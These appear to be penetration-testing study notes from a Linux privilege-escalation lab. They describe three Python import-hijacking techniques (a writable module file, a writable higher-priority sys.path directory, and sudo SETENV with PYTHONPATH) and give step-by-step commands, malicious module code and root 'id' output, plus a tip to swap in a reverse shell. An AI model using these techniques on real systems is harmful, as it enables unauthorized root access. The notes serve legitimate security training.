
Three related techniques for hijacking Python module imports to gain code execution as root, when a root-run script imports a module.

---

## 1. Writable Module File (Direct Hijack)

### Concept
If a Python module imported by a root-run script is **writable by our user**, we can inject code directly into it.

### Example Scenario
Target script (`mem_status.py`) imports `psutil` and calls `psutil.virtual_memory()`.

**Step 1 — Find the function definition:**
```bash
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
```

**Step 2 — Check file permissions:**
```bash
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# -rw-r--rw- 1 root staff 87339 ...
```
- World-writable (`rw-` at the end) — common in dev environments with relaxed permissions.

**Step 3 — Inject code at the start of the target function:**
```python
def virtual_memory():
    #### Hijacking
    import os
    os.system('id')

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    _TOTAL_PHYMEM = ret.total
    return ret
```

**Step 4 — Trigger via the script's sudo execution:**
```bash
sudo /usr/bin/python3 ./mem_status.py
```
```
uid=0(root) gid=0(root) groups=0(root)
...
```
→ Once confirmed, replace the test payload (`id`) with a reverse shell or other payload of choice.

---

## 2. Python Library Search Path (PYTHONPATH) Hijacking

### Concept
Python searches for modules in a **priority-ordered list of paths** (`sys.path`). If a higher-priority path is writable, a malicious module with the same name can shadow the legitimate one.

**View the search order:**
```bash
python3 -c 'import sys; print("\n".join(sys.path))'
```
```
/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

### Requirements
1. The real module is in a **lower-priority** path.
2. We have **write access** to a **higher-priority** path.

**Step 1 — Find where the real module lives:**
```bash
pip3 show psutil
# Location: /usr/local/lib/python3.8/dist-packages
```

**Step 2 — Check higher-priority paths for writable permissions:**
```bash
ls -la /usr/lib/python3.8
# drwxr-xrwx 30 root root ... (world-writable)
```
- `/usr/lib/python3.8` sits **above** psutil's real location in `sys.path` → exploitable.

**Step 3 — Create a malicious module with the same name + matching function signature:**
```python
#!/usr/bin/env python3
# psutil.py placed in /usr/lib/python3.8

import os

def virtual_memory():
    os.system('id')
```
> Critical: module name and function name/arg count must match the real one, or the import/call will fail differently than expected.

**Step 4 — Run the target script as before:**
```bash
sudo /usr/bin/python3 mem_status.py
```
```
uid=0(root) gid=0(root) groups=0(root)
Traceback ... AttributeError: 'NoneType' object has no attribute 'available'
```
- Code executes as root before the script errors out (since the fake function doesn't return real data) — execution already achieved at that point.

---

## 3. PYTHONPATH Environment Variable Hijacking

### Concept
`PYTHONPATH` env var tells Python additional directories to search for modules — **first**, ahead of defaults. If we can set env vars for a `sudo`-permitted Python execution, we can redirect the module search entirely to our own directory.

**Step 1 — Check sudo permissions for SETENV flag:**
```bash
sudo -l
```
```
User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```
- `SETENV` → allowed to pass environment variables through to the sudo'd command.

**Step 2 — Place the malicious module (e.g. `psutil.py`) in a writable dir (e.g. `/tmp`):**
```python
#!/usr/bin/env python3
import os

def virtual_memory():
    os.system('id')
```

**Step 3 — Run with PYTHONPATH pointed at that directory:**
```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```
```
uid=0(root) gid=0(root) groups=0(root)
...
```
→ Root execution achieved without needing write access to any system Python path — only requires `SETENV` sudo rights on the Python binary.

---

## Key Takeaways
| Technique | Requirement |
|---|---|
| Direct module hijack | Write access to the actual module file |
| PYTHONPATH search order hijack | Write access to a higher-priority `sys.path` directory |
| PYTHONPATH env var hijack | `sudo SETENV` rights on a Python binary + writable scratch dir |

All three rely on the same root cause: **Python trusts whatever module it finds first matching the imported name** — controlling that lookup path (file contents or search order) yields code execution under the privileges of whoever runs the script.